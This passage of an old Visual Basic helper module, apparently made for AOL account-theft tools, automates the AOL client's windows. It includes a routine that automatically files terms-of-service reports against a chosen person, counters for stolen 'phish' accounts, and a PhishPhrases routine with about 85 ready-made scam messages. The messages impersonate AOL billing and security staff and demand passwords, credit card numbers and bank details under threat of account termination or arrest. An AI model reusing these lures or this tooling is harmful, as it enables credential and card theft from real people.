        Dim RoomName As String, wgf As Long, RoomCategory As String, okwin As Long
        Dim OKButton As Long, Index As Long
AoFrame& = FindWindow("AOL Frame25", vbNullString)
AoMDI& = FindWindowEx(AoFrame&, 0&, "MDIClient", vbNullString)
ChatWin& = FindRoom()
NotifyButton& = FindWindowEx(ChatWin&, 0&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
NotifyButton& = FindWindowEx(ChatWin&, NotifyButton&, "_AOL_Icon", vbNullString)
Call PostMessage(NotifyButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(NotifyButton&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
TosWin& = FindWindowEx(AoMDI&, 0&, "AOL Child", "Notify AOL")
CategoryCombo& = FindWindowEx(TosWin&, 0&, "_AOL_Combobox", vbNullString)
DateTimeBox& = FindWindowEx(TosWin&, 0&, "_AOL_Edit", vbNullString)
RoomNameBox& = FindWindowEx(TosWin&, DateTimeBox&, "_AOL_Edit", vbNullString)
PersonBox& = FindWindowEx(TosWin&, RoomNameBox&, "_AOL_Edit", vbNullString)
ViolationBox& = FindWindowEx(TosWin&, PersonBox&, "_AOL_Edit", vbNullString)
SendButton1& = FindWindowEx(TosWin&, 0&, "_AOL_Icon", vbNullString)
SendButton1& = FindWindowEx(TosWin&, SendButton1&, "_AOL_Icon", vbNullString)
SendButton1& = FindWindowEx(TosWin&, SendButton1&, "_AOL_Icon", vbNullString)
SendButton1& = FindWindowEx(TosWin&, SendButton1&, "_AOL_Icon", vbNullString)
SendButton& = FindWindowEx(TosWin&, SendButton1&, "_AOL_Icon", vbNullString)
Loop Until TosWin& <> 0& And CategoryCombo& <> 0& And DateTimeBox& <> 0& And PersonBox& <> 0& And ViolationBox& <> 0& And SendButton& <> 0&
RoomName$ = GetChatName()
wgf& = InStr(RoomName$, " - ")
RoomCategory$ = Left(RoomName$, wgf& - 1)
RoomName$ = Right(RoomName$, Len(RoomName$) - Len(RoomCategory$) - 3)
Select Case RoomCategory$
Case "Times Square": Index& = 0&
Case "Arts and Entertainment": Index& = 1&
Case "Friends": Index& = 2&
Case "Life": Index& = 3&
Case "News, Sports, and Finance": Index& = 4&
Case "Places": Index& = 5&
Case "Romance": Index& = 6&
Case "Special Interests": Index& = 7&
Case "Germany": Index& = 8&
Case "UK Experience": Index& = 9&
Case "France": Index& = 10&
Case "Canada": Index& = 11&
Case "Conference Room": Index& = 12&
Case "Kids Room": Index& = 13&
Case "Teen Room": Index& = 14&
Case "Japan": Index& = 15&
Case "Other": Index& = 16&
Case Else: Index& = 16&
End Select
Call PostMessage(CategoryCombo&, CB_SETCURSEL, Index&, 0&)
Call SendMessageByString(DateTimeBox&, WM_SETTEXT, 0&, Now)
Call SendMessageByString(RoomNameBox&, WM_SETTEXT, 0&, RoomName$)
Call SendMessageByString(PersonBox&, WM_SETTEXT, 0&, PersonToTos$)
Call SendMessageByString(ViolationBox&, WM_SETTEXT, 0&, TosViolation$)
Call PostMessage(SendButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(SendButton&, WM_LBUTTONUP, 0&, 0&)
Do: DoEvents
okwin& = FindWindow("#32770", "America Online")
OKButton& = FindWindowEx(okwin&, 0&, "Button", vbNullString)
Loop Until okwin& <> 0& And OKButton& <> 0&
Call PostMessage(OKButton&, WM_LBUTTONDOWN, 0&, 0&)
Call PostMessage(OKButton&, WM_LBUTTONUP, 0&, 0&)
Call SendMessage(TosWin&, WM_CLOSE, 0&, 0&)
End Sub
Public Function PhishMasterCount(listbox As Control) As Long
'Checks to see how many of your phish are masters
        Dim SearchIndex As Long, CurrentCount As Long
CurrentCount& = 0&
For SearchIndex& = 0 To listbox.ListCount - 1
If InStr(listbox.List(SearchIndex&), "[m]") <> 0& Then
CurrentCount& = CurrentCount& + 1
End If
Next SearchIndex&
PhishMasterCount& = CurrentCount&
End Function
Public Function PhishUnknownCount(listbox As Control) As Long
'Checks to see how many phish you have that are unknown
        Dim SearchIndex As Long, CurrentCount As Long
CurrentCount& = 0&
For SearchIndex& = 0 To listbox.ListCount - 1
If InStr(listbox.List(SearchIndex&), "[?]") <> 0& Then
CurrentCount& = CurrentCount& + 1
End If
Next SearchIndex&
PhishUnknownCount& = CurrentCount&
End Function
Public Sub PhishPhrases(Txt As String)
'By Sasquach
'I copied this out of FrenzeyMisc.Bas cause Well it was just to good. =)
'So thanks Sasquach
    Dim X As Long, Phrazes As Long
    Randomize X
    Phrazes = Int((Val("140") * Rnd) + 1)
    If Phrazes = "1" Then
    Txt = "Hi, I'm with AOL's Online Security. We have found hackers trying to get into your MailBox. Please verify your password immediately to avoid account termination.     Thank you.                                    AOL Staff"
    ElseIf Phrazes = "2" Then
    Txt = "Hello. I am with AOL's billing department. Due to some invalid information, we need you to verify your log-on password to avoid account cancellation. Thank you, and continue to enjoy America Online."
    ElseIf Phrazes = "3" Then
    Txt = "Good Evening. I am with AOL's Virus Protection Group. Due to some evidence of virus uploading, I must validate your sign-on password. Please STOP what you're doing and Tell me your password.       -- AOL VPG"
    ElseIf Phrazes = "4" Then
    Txt = "Hello, I am the Head Of AOL's XPI Link Department. Due to a configuration error in your version of AOL, I need you to verify your log-on password to me, to prevent account suspension and possible termination.  Thank You."
    ElseIf Phrazes = "5" Then
    Txt = "Hi. You are speaking with AOL's billing manager, Steve Case. Due to a virus in one of our servers, I am required to validate your password. You will be awarded an extra 10 FREE hours of air-time for the inconvenience."
    ElseIf Phrazes = "6" Then
    Txt = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
    ElseIf Phrazes = "7" Then
    Txt = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
    ElseIf Phrazes = "8" Then
    Txt = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
    ElseIf Phrazes = "9" Then
    Txt = "Hi, I'm Alex Troph of America Online Sevice Department. Your online account, #3560028, is displaying a billing error. We need you to respond back with your name, address, card number, expiration date, and daytime phone number. Sorry for this inconvenience."
    ElseIf Phrazes = "10" Then
    Txt = "Hello, I am a representative of the VISA Corp.  Due to a computer error, we are unable complete your membership to America Online. In order to correct this problem, we ask that you hit the `Respond` key, and reply with your full name and password, so that the proper changes can be made to avoid cancellation of your account. Thank you for your time and cooperation.  :-)"
    ElseIf Phrazes = "11" Then
    Txt = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records. Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again. Thank you.  :-)"
    ElseIf Phrazes = "12" Then
    Txt = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Telephone#, Visa Card#, and Expiration date. If this information is not processed promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
    ElseIf Phrazes = "13" Then
    Txt = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that your validation process is almost complete.  To complete your validation process I need you to please hit the `Respond` key and reply with the following information: Name, Address, Phone Number, City, State, Zip Code,  Credit Card Number, Expiration Date, and Bank Name.  Thank you for your time and cooperation and we hope that you enjoy America Online. :-)"
    ElseIf Phrazes = "14" Then
    Txt = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation."
    ElseIf Phrazes = "15" Then
    Txt = "Hello, this is the America Online Billing Department.  Due to a System Crash, we have lost your billing information.  Please hit respond, then enter your Credit Card Number, and experation date.  Thank You, and sorry for the inconvience."
    ElseIf Phrazes = "16" Then
    Txt = "ATTENTION:  This is the America Online billing department.  Due to an error that occured in your Membership Enrollment process we did not receieve your billing information.  We need you to reply back with your Full name, Credit card number with Expiration date, and your telephone number.  We are very sorry for this inconvenience and hope that you continue to enjoy America Online in the future."
    ElseIf Phrazes = "17" Then
    Txt = "Sorry, there seems to be a problem with your bill. Please reply with your password to verify that you are the account holder.  Thank you."
    ElseIf Phrazes = "18" Then
    Txt = "Sorry  the credit card you entered is invalid. Perhaps you mistyped it?  Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it. Thank you and enjoy AOL."
    ElseIf Phrazes = "19" Then
    Txt = "Sorry, your credit card failed authorization. Please reply with your credit card number, expiration date, name on card, billing address, and phone number, and we will fix it.  Thank you and enjoy AOL."
    ElseIf Phrazes = "20" Then
    Txt = "Due to the numerous use of identical passwords of AOL members, we are now generating new passwords with our computers.  Your new password is 'Stryf331', You have the choice of the new or old password.  Click respond and try in your preferred password.  Thank you"
    ElseIf Phrazes = "21" Then
    Txt = "I work for AOL's Credit Card department. My job is to check EVERY AOL account for credit accuracy.  When I got to your account, I am sorry to say, that the Credit information is now invalid. We DID have a sysem crash, which my have lost the information, please click respond and type your VALID credit card info.  Card number, names, exp date, etc, Thank you!"
    ElseIf Phrazes = "22" Then
    Txt = "Hello I am with AOL Account Defense Department.  We have found that your account has been dialed from San Antonia,Texas. If you have not used it there, then someone has been using your account.  I must ask for your password so I can change it and catch him using the old one.  Thank you."
    ElseIf Phrazes = "23" Then
    Txt = "Hello member, I am with the TOS department of AOL.  Due to the ever changing TOS, it has dramatically changed.  One new addition is for me, and my staff, to ask where you dialed from and your password.  This allows us to check the REAL adress, and the password to see if you have hacked AOL.  Reply in the next 1 minute, or the account WILL be invalidated, thank you."
    ElseIf Phrazes = "24" Then
    Txt = "Hello member, and our accounts say that you have either enter an incorrect age, or none at all.  This is needed to verify you are at a legal age to hold an AOL account.  We will also have to ask for your log on password to further verify this fact. Respond in next 30 seconds to keep account active, thank you."
    ElseIf Phrazes = "25" Then
    Txt = "Dear member, I am Greg Toranis and I werk for AOL online security. We were informed that someone with that account was trading sexually explecit material. That is completely illegal, although I presonally do not care =).  Since this is the first time this has happened, we must assume you are NOT the actual account holder, since he has never done this before. So I must request that you reply with your password and first and last name, thank you."
    ElseIf Phrazes = "26" Then
    Txt = "Hello, I am Steve Case.  You know me as the creator of America Online, the world's most popular online service.  I am here today because we are under the impression that you have 'HACKED' my service.  If you have, then that account has no password.  Which leads us to the conclusion that if you cannot tell us a valid password for that account you have broken an international computer privacy law and you will be traced and arrested.  Please reply with the password to avoind police action, thank you."
    ElseIf Phrazes = "27" Then
    Txt = "Dear AOL member.  I am Guide zZz, and I am currently employed by AOL.  Due to a new AOL rate, the $10 for 20 hours deal, we must ask that you reply with your log on password so we can verify the account and allow you the better monthly rate. Thank you."
    ElseIf Phrazes = "28" Then
    Txt = "Hello I am CATWatch01. I witnessed you verbally assaulting an AOL member.  The account holder has never done this, so I assume you are not him.  Please reply with your log on password as proof.  Reply in next minute to keep account active."
    ElseIf Phrazes = "29" Then
    Txt = "I am with AOL's Internet Snooping Department.  We watch EVERY site our AOL members visit.  You just recently visited a sexually explecit page.  According to the new TOS, we MUST imose a $10 fine for this.  I must ask you to reply with either the credit card you use to pay for AOL with, or another credit card.  If you do not, we will notify the authorities.  I am sorry."
    ElseIf Phrazes = "30" Then
    Txt = "Dear AOL Customer, despite our rigorous efforts in our battle against 'hackers', they have found ways around our system, logging onto unsuspecting users accounts WITHOUT thier passwords. To ensure you are the responsible, paying customer -and not a 'hacker'- we need you to click on the RESPOND button and enter your password for verification. We are very sorry for this trouble. --AOL Security/B.A.H. Team"
    ElseIf Phrazes = "31" Then
    Txt = "Dear member, I am a Service Representitive with the America Online Corporation,and I am sorry to inform you that we have encountered an error in our Main-Frame computer system and lost the billing information to some of our users.  Unfortunatley your account was in that group. We need you to reply back with your billing information including: Name (as appears on card), address, and C.C. Number w/EXP Date. Failure in correcting this problem will result in account termination. Thank you for your cooperation-for your assistance with this problem your account will be credited w/2 free hours of online time.  --AOL Cust. Service"
    ElseIf Phrazes = "32" Then
    Txt = "Good evening AOL User, our billing department is having computer trouble -the terminal containing your billing information- and we are positive that our computers have been fully restored, but to verify this information and to cause the least amount of complications as possible, we only need you to click RESPOND and enter your Credit Card number including EXP. Date...we are very sorry for any trouble.   --AOL Billing Department"
    ElseIf Phrazes = "33" Then
    Txt = "Hello I am with America Online New user Data base we have encounterd an error in your sign up process please respond and State your full name first and last and your personal log in password."
    ElseIf Phrazes = "34" Then
    Txt = "Hello I am with America Online Billing department and we have you down to get billed in 2weeks $300 dollars if you disagree please respond with your full name Creidt card number with experation date address area code city state and phone number."
    ElseIf Phrazes = "35" Then
    Txt = "Hello i am With America  Online billing Dep. we are missing your sign up file from our user data base please click respond and send us your full name address city state zipcode areacode phone number Creidt card with experation date and personal log on password."
    ElseIf Phrazes = "36" Then
    Txt = "Hello, I am an America Online Billing Representative and I am very sorry to inform you that we have accidentally deleted your billing records from our main computer.  I must ask you for your full name, address, day/night phone number, city, state, credit card number, expiration date, and the bank.  I am very sorry for the invonvenience.  Thank you for your understanding and cooperation!  Brad Kingsly, (CAT ID#13)  Vienna, VA."
    ElseIf Phrazes = "37" Then
    Txt = "Hello, I am a member of the America Online Security Agency (AOSA), and we have identified a scam in your billing.  We think that you may have entered a false credit card number on accident.  For us to be sure of what the problem is, you MUST respond with your password.  Thank you for your cooperation!  (REP Chris)  ID#4322."
    ElseIf Phrazes = "38" Then
    Txt = "Hello, I am an America Online Billing Representative. It seems that the America On-line password record was tampered with by un-authorized officials. Some, but very few passwords were changed. This slight situation occured not less then five minutes ago.I will have to ask you to click the respond button and enter your log-on password. You will be informed via E-Mail with a conformation stating that the situation has been resolved.Thank you for your cooperation. Please keep note that you will be recieving E-Mail from us at AOLBilling. And if you have any trouble concerning passwords within your account life, call our member services number at 1-800-328-4475."
    ElseIf Phrazes = "39" Then
    Txt = "Dear AOL member, We are sorry to inform you that your account information was accidentely deleted from our account database. This VERY unexpected error occured not less than five minutes ago.Your screen name (not account) and passwords were completely erased. Your mail will be recovered, but your billing info will be erased Because of this situation, we must ask you for your password. I realize that we aren't supposed to ask your password, but this is a worst case scenario that MUST be corrected promptly, Thank you for your cooperation."
    ElseIf Phrazes = "40" Then
    Txt = "AOL User: We are very sorry to inform you that a mistake was made while correcting people's account info. Your screen name was (accidentely) selected by AOL to be deleted. Your account cannot be totally deleted while you are online, so luckily, you were signed on for us to send this message.All we ask is that you click the Respond button and enter your logon password. I can also asure you that this scenario will never occur again. Thank you for your coop"
    ElseIf Phrazes = "41" Then
    Txt = "Hello, I am with the AOL User Resource Department, and due to an error in your log on we failed to recieve your logon password, for our records, please click 'respond' then state your Screen Name and Password.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
    ElseIf Phrazes = "42" Then
    Txt = "Good evening, I am with the America Online User Department, and due to a system crash, we have lost your information, for out records please click 'respond' and state your Screen Name, and logon Password.  Thank you, and enjoy your time on AOL."
    ElseIf Phrazes = "43" Then
    Txt = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
    ElseIf Phrazes = "44" Then
    Txt = "Hi, I am with the America Online Hacker enforcement group, we have detected hackers using your account, we need to verify your identity, so we can catch the illicit users of your account, to prove your identity, please click 'respond' then state your Screen Name, Personal Password, Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Thank you and have a nice day!"
    ElseIf Phrazes = "45" Then
    Txt = "Hello, how is one of our more privelaged OverHead Account Users doing today? We are sorry to report that due to hackers, Stratus is reporting problems, please respond with the last four digits of your home telephone number and Logon PW. Thanks -AOL Acc.Dept."
    ElseIf Phrazes = "46" Then
    Txt = "Please click on 'respond' and send me your personal logon password immediately so we may validate your account.  Failure to cooperate may result in permanent account termination.  Thank you for your cooperation and enjoy the service!"
    ElseIf Phrazes = "47" Then
    Txt = "Due to problems with the New Member Database of America Online, we are forced to ask you for your personal logon password online.  Please click on 'respond' and send me this information immediately or face account termination!  Thank you for your cooperation."
    ElseIf Phrazes = "48" Then
    Txt = "Hello current user,we had a virus in are system today around 8:30 this morning,Random memory loses followed!We are going to have to ask for your billing info that you entered in when you signed up![Credit Card number,Address,Phone number,Zip code,State]To keep your account active,in case you do not reply with the information requested your account will be shut down,If this should happen,contact us at our 800#!Thank you for your cooperation! :-)   :AOL Billing"
    ElseIf Phrazes = "49" Then
    Txt = "During your sign on period your Credit Card number did not cycle,please respond with the credit card number used during sign-up!To remain signed on our service,If you do not reply we will have to terminate your account,If this happens please contact our 800# at [1-800-827-6364].Thank you for your time,for your cooperation your account will be credited 10 free hours!  :-)      :AOL Billing"
    ElseIf Phrazes = "50" Then
    Txt = "Hello current member,This is the AOL billing department,We are going have to ask you for your credit card information you have used to make the account you are currently on!We had a bug in the system earlier and it may of caused errors in your bill,When you reply we will verify your account and send you,your current monthes total!If there should be errors,please contact us at [1-800-827-3891].Thank you for your time.          :AOL Billing"
    ElseIf Phrazes = "51" Then
    Txt = "Sorry to disturb you, but are records indicate the the credit card number you gave us has expired.  Please click respond and type in your cc# so that i may verify this and correct all errors!"
    ElseIf Phrazes = "52" Then
    Txt = "I work for Intel, I have a great new catalouge! If you would like this catalouge and a coupon for $200 off your next Intel purchase, please click on respond, and give me your address, full name, and your credit card number. Thanks! |=-)"
    ElseIf Phrazes = "53" Then
    Txt = "Hello, I am TOS ADVISOR and seeing that I made a mistake  we seem to have failed to recieve your logon password. Please click respond and enter your Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
    ElseIf Phrazes = "54" Then
    Txt = "Pardon me, I am with AOL's Staff and due to a transmission error we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond within 2 minutes too keep this account active. Thank you for your cooperation."
    ElseIf Phrazes = "55" Then
    Txt = "Hello, I am with America Online and due to technical problems we have had problems verifying some things Your Full name, address, Credit Card #, Bank Name, Expiration Date, and home phone number. Please respond as soon as possible  Thank you for your time."
    ElseIf Phrazes = "56" Then
    Txt = "Dear User,     Upon sign up you have entered incorrect credit information. Your current credit card information  does not match the name and/or address.  We have rescently noticed this problem with the help of our new OTC computers.  If you would like to maintain an account on AOL, please respond with your Credit Card# with it's exp.date,and your Full name and address as appear on the card.  And in doing so you will be given 15 free hours.  Reply within 5 minutes to keep this accocunt active."
    ElseIf Phrazes = "57" Then
    Txt = "Hello I am a represenative of the Visa Corp. emp# C8205183W. Due to a malfunction in our system we were unable to process your registration to America Online. In order to correct this mistake, we ask that you hit the 'Respond' key, and reply with the following information: Name, Address, Tele#, Visa Card#, and Exp. Date. If this information is not received promptly your account will be terminated. For any further questions please contact us at 1-800-336-8427. Thank You."
    ElseIf Phrazes = "58" Then
    Txt = "Hello and welcome to America online.  We know that we have told you not to reveal your billing information to anyone, but due to an unexpected crash in our systems, we must ask you for the following information to verify your America online account: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. After this initial contact we will never again ask you for your password or any billing information. Thank you for your time and cooperation.  :-)"
    ElseIf Phrazes = "59" Then
    Txt = "Hello, I am a represenative of the AOL User Resource Dept.  Due to an error in our computers, your registration has failed authorization. To correct this problem we ask that you promptly hit the `Respond` key and reply with the following information: Name, Address, Telephone#, Credit Card#, Bank Name, and Expiration Date. We hope that you enjoy are services here at America Online. Thank You.  For any further questions please call 1-800-827-2612. :-)"
    ElseIf Phrazes = "60" Then
    Txt = "Hello, I am a member of the America Online Billing Department.  We are sorry to inform you that we have experienced a Security Breach in the area of Customer Billing Information.  In order to resecure your billing information, we ask that you please respond with the following information: Name, Addres, Tele#, Credit Card#, Bank Name, Exp. Date, Screen Name, and Log-on Password. Failure to do so will result in immediate account termination. Thank you and enjoy America Online.  :-)"
    ElseIf Phrazes = "61" Then
    Txt = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted! "
    ElseIf Phrazes = "62" Then
    Txt = "Hello AOL Member , I am with the OnLine Technical Consultants(OTC).  You are not fully registered as an AOL memberand you are going OnLine ILLEGALLY. Please respond to this IM with your Credit Card Number , your full name , the experation date on your Credit Card and the Bank.  Please respond immediatly so that the OTC can fix your problem! Thank you and have a nice day!  : )"
    ElseIf Phrazes = "63" Then
    Txt = "Hello AOL Memeber.  I am sorry to inform you that a hacker broke into our system and deleted all of our files.  Please respond to this IM with you log-on password password so that we can verify billing , thank you and have a nice day! : )"
    ElseIf Phrazes = "64" Then
    Txt = "Hello User.  I am with the AOL Billing Department.  This morning their was a glitch in our phone lines.  When you signed on it did not record your login , so please respond to this IM with your log-on password so that we can verify billing , thank you and have a nice day! : )"
    ElseIf Phrazes = "65" Then
    Txt = "Dear AOL Member.  There has been hackers using your account.  Please respond to this IM with your log-on password so that we can verify that you are not the hacker.  Respond immedialtly or YOU will be considered the hacker and YOU wil be prosecuted! Thank you and have a nice day.  : )"
    ElseIf Phrazes = "66" Then
    Txt = "Hello , I am with the Hacker Enforcement Team(HET).  There have been many interruptions in your phone lines and we think it is being caused by hackers. Please respond with your log-on password , your Credit Card Number , your full name , the experation date on your Credit Card , and the bank.  We are asking you this so that we can verify you.  Respond immediatly or YOU will be considered the hacker and YOU will be prosecuted!"
    ElseIf Phrazes = "67" Then
    Txt = "AOL Member , I am sorry to bother you but your account information has been deleted by hackers.  AOL has searched every bank but has found no record of you.  Please respond to this IM with your log-on password , Credit Card Number , Experation Date , you Full Name , and the Bank.  Please respond immediatly so that we can get this fixed.  Thank you and have a nice day.   :)"
    ElseIf Phrazes = "68" Then
    Txt = "Dear Member , I am sorry to inform you that you have 5 TOS Violation Reports..the maximum you can have is five.  Please respond to this IM with your log-on password , your Credit Card Number , your Full Name , the Experation Date , and the Bank.  If you do not respond within 2 minutes than your account will be TERMINATED!! Thank you and have a nice day.  : )"
    ElseIf Phrazes = "69" Then
    Txt = "Hello,Im with OTC(Online Technical Consultants).Im here to inform you that your AOL account is showing a billing error of $453.26.To correct this problem we need you to respond with your online password.If you do not comply,you will be forced to pay this bill under federal law. "
    ElseIf Phrazes = "70" Then
    Txt = "Hello,Im here to inform you that you just won a online contest which consisted of a $3000 dollar prize.We seem to have lost all of your account info.So in order to receive your prize you need to respond with your log on password so we can rush your prize straight to you!  Thank you."
    ElseIf Phrazes = "71" Then
    Txt = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation."
    ElseIf Phrazes = "72" Then
    Txt = "Hello, I am with the AOL User Resource Department, and due to an error caused by SprintNet, we failed to receive your log on password, for our records.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Please click 'respond' then state your Screen Name and Password. Remember, after this initial account validation America Online will never ask for any account information again.  Thank you.  :-)"
    ElseIf Phrazes = "73" Then
    Txt = "Attention:The message at the bottom of the screen is void when speaking to AOL employess.We are very sorry to inform you that due to a legal conflict, the Sprint network(which is the network AOL uses to connect it users) is witholding the transfer of the log-in password at sign-on.To correct this problem,We need you to click on RESPOND and enter your password, so we can update your personal Master-File,containing all of your personal info.  We are very sorry for this inconvience --AOL Customer Service Dept."
    ElseIf Phrazes = "74" Then
    Txt = "Hello, I am with the America Online Password Verification Commity. Due to many members incorrectly typing thier passwords at first logon sequence I must ask you to retype your password for a third and final verification. No AOL staff will ask you for your password after this process. Please respond within 2 minutes to keep this account active."
    ElseIf Phrazes = "75" Then
    Txt = "Remember AOL will never ask for your password or billing information online, but due to a problem with all Sprint and TymeNet Local Access telephone numbers I must report all system errors within 24 hours. You cannot stay Online unless you respond with your VALID password.  Thank you for your cooperation "
    ElseIf Phrazes = "76" Then
    Txt = "Please disregard the message in red. Unfortunately, a hacker broke into the main AOL computer and managed to destroy our password verification logon routine and user database, this means that anyone could log onto your account without any password validation. The red message was added to fool users and make it difficult for AOL to restore your account information. To avoid canceling your account, will require you to respond with your password. After this, no AOL employee will ask you for your password again."
    ElseIf Phrazes = "77" Then
    Txt = "Dear America Online user, due to the recent America Online crash, your password has been lost from the main computer systems'.  To fix this error, we need you to click RESPOND and respond with your current password.  Please respond within 2 minutes to keep active.  We are sorry for this inconvinience, this is a ONE time emergency.  Thank you and continue to enjoy America Online!"
    ElseIf Phrazes = "78" Then
    Txt = "Hello, I am an America Online Administrator.  Due to a problem we're experiencing with the Sprint Network, we need you to verify your log-in password to me so that you can continue this log-in session with America Online.  We apologize for this inconvenience, and thank you for cooperation. "
    ElseIf Phrazes = "79" Then
    Txt = "Dear User, I am sorry to report that your account has been traced and has shown that you are signed on from another location.  To make sure that this is you please enter your sign on password so we can verify that this is you.  Thank You! AOL."
    ElseIf Phrazes = "80" Then
    Txt = "Hello, I am sorry to inturrupt but I am from the America Online Service Departement. We have been having major problems with your account information. Now we understand that you have been instructed not to give out and information, well were sorry to say but in this case you must or your account will be terminated. We need your full name as well as last, Adress, Credit Card number as well as experation date as well as logon password. We our really sorry for this inconveniance and grant you 10 free hours. Thank you and enjoy AOL."
    ElseIf Phrazes = "81" Then
    Txt = "Hello, My name is Dan Weltch from America Online. We have been having extreme difficulties with your records. Please give us your full log-on Scree Name(s) as well as the log-on PW(s), thank you :-)"
    ElseIf Phrazes = "82" Then
    Txt = "Hello, I am the TOSAdvisor. I am on a different account because there has been hackers invading our system and taking over our accounts. If you could please give us your full log on PW so we can correct this problem, thank you and enjoy AOL. "
    ElseIf Phrazes = "83" Then
    Txt = "Hello, I am from the America Online Credit Card Records and we have been experiancing a major problem with your CC# information. For us to fix this we need your full log-on screen names(s) and password(s), thank. "
    ElseIf Phrazes = "84" Then
    Txt = "Hi, I'm with Anti-Hacker Dept of AOL. Due to Thë break-in's into our system, we have experienced problems. We need you to respond with your credit card #, exp date, full name, address, and phone # to correct errors. "
    ElseIf Phrazes = "85" Then
    Txt = "Hello, I am with the America Online Billing Department, due to a failure in our data carrier, we did not recieve your information when you made your account, for our records, please click 'respond' then state your Full Name, Address, City, State, Zip Code, Credit Card number, Bank Name and Expiration Date.  Failure to comply will result in account invalidation, and force you to go throught the new member sign on procedure again.  Thank you."
    
    End If
    Txt = "Hello, I am with the America Online New User Validation Department.  I am happy to inform you that the validation process is almost complete.  To complete the validation process i need you to respond with your full name, address, phone number, city, state, zip code,  credit card number, expiration date, and bank name.  Thank you and enjoy AOL. "
End Sub


Public Function Online() As Boolean
'Sees to see if the user is online
Online = CBool(FindWelcome&)
End Function
Public Sub Open_DownloadMng()
Call PopUpIcon(4, "D")
End Sub
Public Sub Open_PCF()
Call PopUpIcon(4, "P")
End Sub
Public Sub Open_OfflineMail()
Call PopUpIcon(4, "O")
End Sub
Public Sub Open_Prefrences()
Call PopUpIcon(4, "P")
End Sub
Public Sub Open_Onlineclock()
Call PopUpIcon(4, "O")
End Sub
Public Sub Open_FavPlaces()
Call PopUpIcon(5, "F")
End Sub
Public Sub Open_News()
Call PopUpIcon(7, "N")
End Sub
Public Sub Open_Computing()
Call PopUpIcon(7, "u")
End Sub
Public Sub Open_ChatNow()
Call PopUpIcon(8, "C")
End Sub
Public Sub Open_BuddList()
Call PopUpIcon(8, "V")
End Sub
Sub CD_OpenDoorCD()
'Opens CD-Rom door
Call MciSendString("set cd door open", 0, 0, 0)
End Sub
Public Sub Pause(DaPause As Long)
'Just like timeout stop and yield
        Dim Current As Long
Current = Timer
Do Until Timer - Current >= DaPause
DoEvents
Loop
End Sub
Public Function PhishTypeCount(listbox As Control, AccType As String) As Long
'Counts how many phish you have of each count
        Dim SearchIndex As Long, CurrentCount As Long
CurrentCount& = 0&
For SearchIndex& = 0 To listbox.ListCount - 1
If InStr(listbox.List(SearchIndex&), "[" & AccType$ & "]") <> 0& Then
CurrentCount& = CurrentCount& + 1
End If
Next SearchIndex&
PhishTypeCount& = CurrentCount&
End Function
Function Percent(Complete As Integer, Total As Variant, TotalOutput As Integer) As Integer
'Gives a precent
On Error Resume Next
Percent = Int(Complete / Total * TotalOutput)
End Function
Sub PercentBar(Shape As Control, Done As Integer, Total As Long)
'A Precent Bar
On Error Resume Next
        Dim X As String
Shape.AutoRedraw = True
Shape.FillStyle = 0
Shape.DrawStyle = 0
Shape.FontName = "Arial Narrow"
Shape.FontSize = 8
Shape.FontBold = False
X = Done / Total * Shape.Width
Shape.Line (0, 0)-(Shape.Width, Shape.Height), RGB(255, 255, 255), BF
